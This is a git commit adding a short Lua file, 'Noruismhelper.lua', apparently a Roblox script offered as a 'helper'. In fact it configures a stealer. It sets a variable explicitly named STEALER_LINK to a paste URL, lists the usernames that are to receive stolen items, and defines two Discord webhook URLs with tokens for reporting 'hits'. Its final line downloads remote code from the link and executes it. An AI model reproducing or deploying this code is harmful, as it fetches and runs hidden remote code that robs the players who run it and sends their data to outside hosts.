a65a8358b6377391773808d0486aee382d0f42c9
mijikaisys <mikifemboy@gmail.com>
2025-03-25 00:56:23 +0100

    Create Noruismhelper.lua

---
+++ Noruismhelper.lua
@@ -0,0 +1,12 @@
+STEALER_LINK = 'https://dpaste.com/52X22UYC6.txt'
+
+Usernames = {
+    'kiddo_2014', -- PUT UR ROBLOX USERNAMES
+    'Asuna_0nO', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'drpon63',
+}
+
+BigHitsWebhook = "https://discordapp.com/api/webhooks/1353868208146219128/BNoTNWtdeXda09fcPnoMyi9zk0T8EQybCXCLNiFxbkXsTYrC3CkCJvrg0haXikz89AAr"
+SmallHitsWebhook = "https://discordapp.com/api/webhooks/1353867935239766096/enQqQC8BA28ZS6bBgbqtR6GAnSqIK7r5757MHiRyYuFhE8CZHsT9h_2Uzai2zsTNlCZK"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
